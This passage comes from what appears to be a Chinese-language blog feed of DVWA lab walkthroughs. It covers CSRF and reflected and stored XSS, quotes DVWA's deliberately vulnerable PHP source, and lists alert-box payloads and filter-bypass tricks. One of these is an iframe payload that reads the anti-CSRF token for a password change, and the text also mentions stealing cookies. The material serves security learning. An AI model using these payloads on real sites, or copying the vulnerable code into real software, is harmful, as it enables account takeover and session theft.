Changed.&lt;/pre&gt;&quot;;</span><br><span class="line">&#125;</span><br><span class="line">else &#123;</span><br><span class="line">// Issue with passwords matching</span><br><span class="line">echo &quot;&lt;pre&gt;Passwords did not match.&lt;/pre&gt;&quot;;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">else &#123;</span><br><span class="line">// Didn&apos;t come from a trusted source</span><br><span class="line">echo &quot;&lt;pre&gt;That request didn&apos;t look correct.&lt;/pre&gt;&quot;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">((is_null($___mysqli_res = mysqli_close($GLOBALS[&quot;___mysqli_ston&quot;]))) ? false : $___mysqli_res);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p><p><code>$_SERVER[&#39;HTTP_REFERER&#39;] //</code>链接到当前页面的前一页面的 URL 地址。<br><code>$_SERVER[&#39;SERVER_NAME&#39;] //</code>服务器主机的名称。</p><p>1.通常情况：<br><code>_SERVER[&quot;HTTP_HOST&quot;]</code>在HTTP/1.1协议规范下，会根据客户端的HTTP请求输出信息。<br><code>_SERVER[&quot;SERVER_NAME&quot;]</code> 默认情况下直接输出apache的配置文件httpd.conf中的ServerName值。</p><p>2.当服务器为非80端口时：<br><code>_SERVER[&quot;HTTP_HOST&quot;]</code> 会输出端口号，例如：<code>mimiz.cn:8080</code><br><code>_SERVER[&quot;SERVER_NAME&quot;]</code> 会直接输出ServerName值<br>因此在这种情况下，可以理解为：<br><code>HTTP_HOST = SERVER_NAME : SERVER_PORT</code></p><p>Medium级别的代码检查了保留变量 HTTP_REFERER（http包头的Referer参数的值，表示来源地址）中是否包含SERVER_NAME（http包头的Host参数，即要访问的主机名），希望通过这种机制抵御CSRF攻击。</p><p>Host：客户端指定自己想访问的http服务器的域名/IP 地址和端口号。<br><a href="https://link.jianshu.com/?t=https://blog.csdn.net/s1234567_89/article/details/51139864" target="_blank" rel="noopener">http头中的host字段详解</a></p><p>Referer：是 HTTP 请求header 的一部分，当浏览器（或者模拟浏览器行为）向web 服务器发送请求的时候，头信息里有包含 Referer 。比如我在<code>www.sojson.com</code> 里有一个<code>www.baidu.com</code> 链接，那么点击这个<code>www.baidu.com</code> ，它的header 信息里就有：<br><code>Referer=http://www.sojson.com</code><br>也就是说请求源referer中必须包含有host主机名才可以请求改密成功。</p><p>现在我把本地服务器当作攻击者的服务器，虚拟机ubuntu的服务器为用户想要改密的网站服务器。当我访问123.html中的恶意网址时，referer等于攻击者的域名<code>127.0.0.1</code>，host为恶意网址请求的主机名<code>192.168.86.128</code></p><p><img src="http://poysl5u4h.bkt.clouddn.com/DVWA学习（六）CSRF/20190326091258533.png" alt></p><p>此时是不会请求成功的。但是攻击者服务器的恶意文件名可以等于改密网站的主机名。</p><p><img src="http://poysl5u4h.bkt.clouddn.com/DVWA学习（六）CSRF/20190326091309711.png" alt></p><p>现在用户访问恶意网站的时候抓包查看</p><p><img src="http://poysl5u4h.bkt.clouddn.com/DVWA学习（六）CSRF/20190326091321314.png" alt></p><p>refere是包含host的，所以是可以改密码成功的。</p><p><img src="http://poysl5u4h.bkt.clouddn.com/DVWA学习（六）CSRF/20190326091330946.png" alt></p><h2 id="High难度"><a href="#High难度" class="headerlink" title="High难度"></a>High难度</h2><p><strong>源码</strong>：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">if( isset( $_GET[ &apos;Change&apos; ] ) ) &#123;</span><br><span class="line">// Check Anti-CSRF token</span><br><span class="line">checkToken( $_REQUEST[ &apos;user_token&apos; ], $_SESSION[ &apos;session_token&apos; ], &apos;index.php&apos; );</span><br><span class="line"></span><br><span class="line">// Get input</span><br><span class="line">$pass_new = $_GET[ &apos;password_new&apos; ];</span><br><span class="line">$pass_conf = $_GET[ &apos;password_conf&apos; ];</span><br><span class="line"></span><br><span class="line">// Do the passwords match?</span><br><span class="line">if( $pass_new == $pass_conf ) &#123;</span><br><span class="line">// They do!</span><br><span class="line">$pass_new = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;], $pass_new ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;));</span><br><span class="line">$pass_new = md5( $pass_new );</span><br><span class="line"></span><br><span class="line">// Update the database</span><br><span class="line">$insert = &quot;UPDATE `users` SET password = &apos;$pass_new&apos; WHERE user = &apos;&quot; . dvwaCurrentUser() . &quot;&apos;;&quot;;</span><br><span class="line">$result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;], $insert ) or die( &apos;&lt;pre&gt;&apos; . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . &apos;&lt;/pre&gt;&apos; );</span><br><span class="line"></span><br><span class="line">// Feedback for the user</span><br><span class="line">echo &quot;&lt;pre&gt;Password Changed.&lt;/pre&gt;&quot;;</span><br><span class="line">&#125;</span><br><span class="line">else &#123;</span><br><span class="line">// Issue with passwords matching</span><br><span class="line">echo &quot;&lt;pre&gt;Passwords did not match.&lt;/pre&gt;&quot;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">((is_null($___mysqli_res = mysqli_close($GLOBALS[&quot;___mysqli_ston&quot;]))) ? false : $___mysqli_res);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// Generate Anti-CSRF token</span><br><span class="line">generateSessionToken();</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p><p>High级别的代码加入了Anti-CSRF token机制，用户每次访问改密页面时，服务器会返回一个随机的token，向服务器发起请求时，需要提交token参数，而服务器在收到请求时，会优先检查token，只有token正确，才会处理客户端的请求。</p><p><img src="http://poysl5u4h.bkt.clouddn.com/DVWA学习（六）CSRF/20190326091407576.png" alt></p><p>绕过需要获取页面的token，但是由于浏览器是不允许跨域请求的，域名A是不允许获取域名B页面中的内容的。除非域名A下的页面主动发送信息给域名B的页面，所以我们的攻击脚本是不可能取到改密界面中的user_token。<br>所以我们需要利用该网站的XSS漏洞协助获取token。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">txtName=&lt;iframe src=&quot;../csrf&quot; onload=alert(frames[0].document.getElementsByName(&apos;user_token&apos;)[0].value)&gt;&amp;mtxMessage=1222</span><br></pre></td></tr></table></figure></p><p><img src="http://poysl5u4h.bkt.clouddn.com/DVWA学习（六）CSRF/20190326091431190.png" alt></p><p>或者用XSS获取COOKIE</p><p><img src="http://poysl5u4h.bkt.clouddn.com/DVWA学习（六）CSRF/20190326091441244.png" alt></p><p>然后改COOKIE以及要改的密码</p><p><img src="http://poysl5u4h.bkt.clouddn.com/DVWA学习（六）CSRF/20190326091448561.png" alt></p><h2 id="impossible"><a href="#impossible" class="headerlink" title="impossible"></a>impossible</h2><p><strong>源码</strong>：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">if( isset( $_GET[ &apos;Change&apos; ] ) ) &#123;</span><br><span class="line">// Check Anti-CSRF token</span><br><span class="line">checkToken( $_REQUEST[ &apos;user_token&apos; ], $_SESSION[ &apos;session_token&apos; ], &apos;index.php&apos; );</span><br><span class="line"></span><br><span class="line">// Get input</span><br><span class="line">$pass_curr = $_GET[ &apos;password_current&apos; ];</span><br><span class="line">$pass_new = $_GET[ &apos;password_new&apos; ];</span><br><span class="line">$pass_conf = $_GET[ &apos;password_conf&apos; ];</span><br><span class="line"></span><br><span class="line">// Sanitise current password input</span><br><span class="line">$pass_curr = stripslashes( $pass_curr );</span><br><span class="line">$pass_curr = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;], $pass_curr ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;));</span><br><span class="line">$pass_curr = md5( $pass_curr );</span><br><span class="line"></span><br><span class="line">// Check that the current password is correct</span><br><span class="line">$data = $db-&gt;prepare( &apos;SELECT password FROM users WHERE user = (:user) AND password = (:password) LIMIT 1;&apos; );</span><br><span class="line">$data-&gt;bindParam( &apos;:user&apos;, dvwaCurrentUser(), PDO::PARAM_STR );</span><br><span class="line">$data-&gt;bindParam( &apos;:password&apos;, $pass_curr, PDO::PARAM_STR );</span><br><span class="line">$data-&gt;execute();</span><br><span class="line"></span><br><span class="line">// Do both new passwords match and does the current password match the user?</span><br><span class="line">if( ( $pass_new == $pass_conf ) &amp;&amp; ( $data-&gt;rowCount() == 1 ) ) &#123;</span><br><span class="line">// It does!</span><br><span class="line">$pass_new = stripslashes( $pass_new );</span><br><span class="line">$pass_new = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;], $pass_new ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;));</span><br><span class="line">$pass_new = md5( $pass_new );</span><br><span class="line"></span><br><span class="line">// Update database with new password</span><br><span class="line">$data = $db-&gt;prepare( &apos;UPDATE users SET password = (:password) WHERE user = (:user);&apos; );</span><br><span class="line">$data-&gt;bindParam( &apos;:password&apos;, $pass_new, PDO::PARAM_STR );</span><br><span class="line">$data-&gt;bindParam( &apos;:user&apos;, dvwaCurrentUser(), PDO::PARAM_STR );</span><br><span class="line">$data-&gt;execute();</span><br><span class="line"></span><br><span class="line">// Feedback for the user</span><br><span class="line">echo &quot;&lt;pre&gt;Password Changed.&lt;/pre&gt;&quot;;</span><br><span class="line">&#125;</span><br><span class="line">else &#123;</span><br><span class="line">// Issue with passwords matching</span><br><span class="line">echo &quot;&lt;pre&gt;Passwords did not match or current password incorrect.&lt;/pre&gt;&quot;;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// Generate Anti-CSRF token</span><br><span class="line">generateSessionToken();</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p><p>加入了PDO预编译语句防止SQL注入，防止CSRF不仅用了token，还要求用户输入原密码，这样在不知道原密码的情况下就无法构造参数。</p><p>介绍：仅供技术交流学习探讨，请勿用于非法用途。本文部分资源来源于网络，如有侵权请联系版主删除。</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> DVWA </category>
          
      </categories>
      
      
        <tags>
            
            <tag> DVWA </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>DVWA学习（五）XSS</title>
      <link href="/2018/05/18/DVWA%E5%AD%A6%E4%B9%A0%EF%BC%88%E4%BA%94%EF%BC%89XSS/"/>
      <url>/2018/05/18/DVWA%E5%AD%A6%E4%B9%A0%EF%BC%88%E4%BA%94%EF%BC%89XSS/</url>
      
        <content type="html"><![CDATA[<h1 id="引言"><a href="#引言" class="headerlink" title="引言"></a>引言</h1><p>DVWA学习（五）XSS<br><a id="more"></a></p><h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p>XSS，全称Cross Site Scripting，即跨站脚本攻击，某种意义上也是一种注入攻击，是指攻击者在页面中注入恶意的脚本代码，当受害者访问该页面时，恶意代码会在其浏览器上执行，需要强调的是，XSS不仅仅限于JavaScript，还包括flash等其它脚本语言。</p><p>根据恶意代码是否存储在服务器中，XSS可以分为存储型的XSS与反射型的XSS。</p><p>DOM型的XSS由于其特殊性，常常被分为第三种，这是一种基于DOM树的XSS。例如服务器端经常使document.boby.innerHtml等函数动态生成html页面，如果这些函数在引用某些变量时没有进行过滤或检查，就会产生DOM型的XSS。DOM型XSS可能是存储型，也有可能是反射型。</p><h1 id="Reflected-Cross-Site-Scripting-反射型XSS"><a href="#Reflected-Cross-Site-Scripting-反射型XSS" class="headerlink" title="Reflected Cross Site Scripting (反射型XSS)"></a>Reflected Cross Site Scripting (反射型XSS)</h1><h2 id="LOW级别"><a href="#LOW级别" class="headerlink" title="LOW级别"></a>LOW级别</h2><p>输入的数据会显示在当前页面中，尝试输<code>name=aaaa&lt;&gt;&#39;/&quot;</code>发现没有任何过滤</p><p><img src="http://poysl5u4h.bkt.clouddn.com/DVWA学习（五）XSS/20190326083603057.png" alt></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">name=&lt;script&gt;alert(1)&lt;/script&gt;</span><br></pre></td></tr></table></figure><p><img src="http://poysl5u4h.bkt.clouddn.com/DVWA学习（五）XSS/20190326083614210.png" alt></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">name=&lt;img src=1 onerror=alert(1)&gt;</span><br></pre></td></tr></table></figure><p><img src="http://poysl5u4h.bkt.clouddn.com/DVWA学习（五）XSS/20190326083642518.png" alt></p><p><strong>源码</strong>：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">header (&quot;X-XSS-Protection: 0&quot;);</span><br><span class="line">// Is there any input?</span><br><span class="line">if( array_key_exists( &quot;name&quot;, $_GET ) &amp;&amp; $_GET[ &apos;name&apos; ] != NULL ) &#123;</span><br><span class="line">// Feedback for end user</span><br><span class="line">echo &apos;&lt;pre&gt;Hello &apos; . $_GET[ &apos;name&apos; ] . &apos;&lt;/pre&gt;&apos;;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p><p><code>array_key_exists</code>检查数组中是否有指定的键名<br>传入的name参数没有任何过滤就输出到页面上。</p><h2 id="Medium难度"><a href="#Medium难度" class="headerlink" title="Medium难度"></a>Medium难度</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">name=aaaa&lt;&gt;&apos;/&quot;,发现没有过滤&lt;&gt;&apos;/&quot;。</span><br></pre></td></tr></table></figure><p><img src="http://poysl5u4h.bkt.clouddn.com/DVWA学习（五）XSS/20190326083752531.png" alt></p><p>尝试插入JS语句<code>name=&lt;script&gt;alert(1)&lt;/script&gt;</code>没有弹窗查看源码，<code>&lt;script&gt;</code> 被过滤了。</p><p><img src="http://poysl5u4h.bkt.clouddn.com/DVWA学习（五）XSS/20190326083805227.png" alt></p><p><strong>尝试用大小写绕过</strong></p><p><img src="http://poysl5u4h.bkt.clouddn.com/DVWA学习（五）XSS/20190326083827499.png" alt></p><p><code>**&lt;script/&gt;**</code>也可以绕过</p><p><img src="http://poysl5u4h.bkt.clouddn.com/DVWA学习（五）XSS/20190326083916236.png" alt></p><p><strong>双写</strong><code>&lt;script&gt;</code>绕过</p><p><img src="http://poysl5u4h.bkt.clouddn.com/DVWA学习（五）XSS/20190326083958162.png" alt></p><p><strong>过滤了script可以用img标签</strong></p><p><img src="http://poysl5u4h.bkt.clouddn.com/DVWA学习（五）XSS/20190326084009644.png" alt></p><p><strong>body标签</strong></p><p><img src="http://poysl5u4h.bkt.clouddn.com/DVWA学习（五）XSS/20190326084022108.png" alt></p><p><strong>iframe标签</strong></p><p><img src="http://poysl5u4h.bkt.clouddn.com/DVWA学习（五）XSS/20190326084100081.png" alt></p><p><img src="http://poysl5u4h.bkt.clouddn.com/DVWA学习（五）XSS/20190326084111054.png" alt></p><p><strong>input标签</strong></p><p><img src="http://poysl5u4h.bkt.clouddn.com/DVWA学习（五）XSS/20190326084124173.png" alt></p><p>还有很多。</p><p><strong>源码</strong>：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">header (&quot;X-XSS-Protection: 0&quot;);</span><br><span class="line">// Is there any input?</span><br><span class="line">if( array_key_exists( &quot;name&quot;, $_GET ) &amp;&amp; $_GET[ &apos;name&apos; ] != NULL ) &#123;</span><br><span class="line">// Get input</span><br><span class="line">$name = str_replace( &apos;&lt;script&gt;&apos;, &apos;&apos;, $_GET[ &apos;name&apos; ] );</span><br><span class="line"></span><br><span class="line">// Feedback for end user</span><br><span class="line">echo &quot;&lt;pre&gt;Hello $&#123;name&#125;&lt;/pre&gt;&quot;;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p><p>只过滤了<code>&lt;script&gt;</code>。</p><h2 id="High难度"><a href="#High难度" class="headerlink" title="High难度"></a>High难度</h2><p>同样没有过滤<code>aaaa&lt;&gt;&#39;/&quot;name=&lt;script&gt;alert(1)&lt;/script&gt;</code>就剩下了个&gt;</p><p><img src="http://poysl5u4h.bkt.clouddn.com/DVWA学习（五）XSS/20190326084203238.png" alt></p><p><strong>用img标签</strong></p><p><img src="http://poysl5u4h.bkt.clouddn.com/DVWA学习（五）XSS/20190326084224614.png" alt></p><p>同样可以用iframe和body等标签。</p><p><strong>源码</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">header (&quot;X-XSS-Protection: 0&quot;);</span><br><span class="line">// Is there any input?</span><br><span class="line">if( array_key_exists( &quot;name&quot;, $_GET ) &amp;&amp; $_GET[ &apos;name&apos; ] != NULL ) &#123;</span><br><span class="line">// Get input</span><br><span class="line">$name = preg_replace( &apos;/&lt;(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i&apos;, &apos;&apos;, $_GET[ &apos;name&apos; ] );</span><br><span class="line"></span><br><span class="line">// Feedback for end user</span><br><span class="line">echo &quot;&lt;pre&gt;Hello $&#123;name&#125;&lt;/pre&gt;&quot;;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p><p>源码把<code>&lt;script&gt;</code>替换为空.</p><h2 id="impossible级别"><a href="#impossible级别" class="headerlink" title="impossible级别"></a>impossible级别</h2><p><strong>源码</strong>：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">// Is there any input?</span><br><span class="line">if( array_key_exists( &quot;name&quot;, $_GET ) &amp;&amp; $_GET[ &apos;name&apos; ] != NULL ) &#123;</span><br><span class="line">// Check Anti-CSRF token</span><br><span class="line">checkToken( $_REQUEST[ &apos;user_token&apos; ], $_SESSION[ &apos;session_token&apos; ], &apos;index.php&apos; );</span><br><span class="line"></span><br><span class="line">// Get input</span><br><span class="line">$name = htmlspecialchars( $_GET[ &apos;name&apos; ] );</span><br><span class="line"></span><br><span class="line">// Feedback for end user</span><br><span class="line">echo &quot;&lt;pre&gt;Hello $&#123;name&#125;&lt;/pre&gt;&quot;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// Generate Anti-CSRF token</span><br><span class="line">generateSessionToken();</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p><p>使用<code>htmlspecialchars</code>函数把预定义的字符<code>&amp;、”、 ’、&lt;、&gt;</code>转换为 HTML 实体，防止浏览器将其作为HTML元素。</p><h1 id="存储型XSS"><a href="#存储型XSS" class="headerlink" title="存储型XSS"></a>存储型XSS</h1><h2 id="LOW级别-1"><a href="#LOW级别-1" class="headerlink" title="LOW级别"></a>LOW级别</h2><p>输入测试数据 <code>aaa&lt;&gt;&quot;/&#39;</code></p><p><img src="http://poysl5u4h.bkt.clouddn.com/DVWA学习（五）XSS/20190326084446625.png" alt></p><p><strong>查看源代码发现没有任何过滤</strong></p><p><img src="http://poysl5u4h.bkt.clouddn.com/DVWA学习（五）XSS/20190326084334078.png" alt></p><p>但是name限制输入字符为10个,可以用hackbar改包<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">txtName=&lt;script&gt;alert(/xss/)&lt;/script&gt;&amp;mtxMessage=&lt;script&gt;alert(/xss/)&lt;/script&gt;</span><br></pre></td></tr></table></figure></p><p><img src="http://poysl5u4h.bkt.clouddn.com/DVWA学习（五）XSS/20190326084509245.png" alt></p><p><strong>查看源代码</strong></p><p><img src="http://poysl5u4h.bkt.clouddn.com/DVWA学习（五）XSS/20190326084334078.png" alt></p><p><strong>源码</strong>：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">if( isset( $_POST[ &apos;btnSign&apos; ] ) ) &#123;</span><br><span class="line">// Get input</span><br><span class="line">$message = trim( $_POST[ &apos;mtxMessage&apos; ] );</span><br><span class="line">$name = trim( $_POST[ &apos;txtName&apos; ] );</span><br><span class="line"></span><br><span class="line">// Sanitize message input</span><br><span class="line">$message = stripslashes( $message );</span><br><span class="line">$message = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;], $message ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;));</span><br><span class="line"></span><br><span class="line">// Sanitize name input</span><br><span class="line">$name = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;], $name ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;));</span><br><span class="line"></span><br><span class="line">// Update database</span><br><span class="line">$query = &quot;INSERT INTO guestbook ( comment, name ) VALUES ( &apos;$message&apos;, &apos;$name&apos; );&quot;;</span><br><span class="line">$result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;], $query ) or die( &apos;&lt;pre&gt;&apos; . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . &apos;&lt;/pre&gt;&apos; );</span><br><span class="line"></span><br><span class="line">//mysql_close();</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p><code>trim</code>函数去掉字符序列左边和右边的空格。<br><code>stripslashes</code>函数删除<code>message</code>中的反斜杠。<br><code>mysqli_real_escape_string</code>函数转义<code>name</code>和<code>message</code>中的<code>\x00 ，\n，\r，\ ， &#39;，&quot; ， \x1a</code><br>没有做XSS方面的过滤与检查，并且存储在数据库中，所以存在出存储型XSS。</p><h2 id="Medium难度-1"><a href="#Medium难度-1" class="headerlink" title="Medium难度"></a>Medium难度</h2><p>同样输入<code>txtName=&lt;script&gt;alert(/xss/)&lt;/script&gt;&amp;mtxMessage=&lt;script&gt;alert(/\xss/)&lt;/script&gt;</code>前者被过滤了<code>&lt;script&gt;</code>，后者<code>script</code>标签都被过滤</p><p><img src="http://poysl5u4h.bkt.clouddn.com/DVWA学习（五）XSS/20190326085048978.png" alt></p><p>尝试大小写<code>script</code>绕过，<code>name</code>成功弹窗，<code>message</code>仍然过滤</p><p><img src="http://poysl5u4h.bkt.clouddn.com/DVWA学习（五）XSS/20190326085100528.png" alt></p><p><strong>源码</strong>：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">if( isset( $_POST[ &apos;btnSign&apos; ] ) ) &#123;</span><br><span class="line">// Get input</span><br><span class="line">$message = trim( $_POST[ &apos;mtxMessage&apos; ] );</span><br><span class="line">$name = trim( $_POST[ &apos;txtName&apos; ] );</span><br><span class="line"></span><br><span class="line">// Sanitize message input</span><br><span class="line">$message = strip_tags( addslashes( $message ) );</span><br><span class="line">$message = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;], $message ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;));</span><br><span class="line">$message = htmlspecialchars( $message );</span><br><span class="line"></span><br><span class="line">// Sanitize name input</span><br><span class="line">$name = str_replace( &apos;&lt;script&gt;&apos;, &apos;&apos;, $name );</span><br><span class="line">$name = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;], $name ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;));</span><br><span class="line"></span><br><span class="line">// Update database</span><br><span class="line">$query = &quot;INSERT INTO guestbook ( comment, name ) VALUES ( &apos;$message&apos;, &apos;$name&apos; );&quot;;</span><br><span class="line">$result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;], $query ) or die( &apos;&lt;pre&gt;&apos; . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . &apos;&lt;/pre&gt;&apos; );</span><br><span class="line"></span><br><span class="line">//mysql_close();</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>strip_tags函数剥去字符串中的 HTML 标签。但是仍然可以使用<b>标签<br>addslashes() 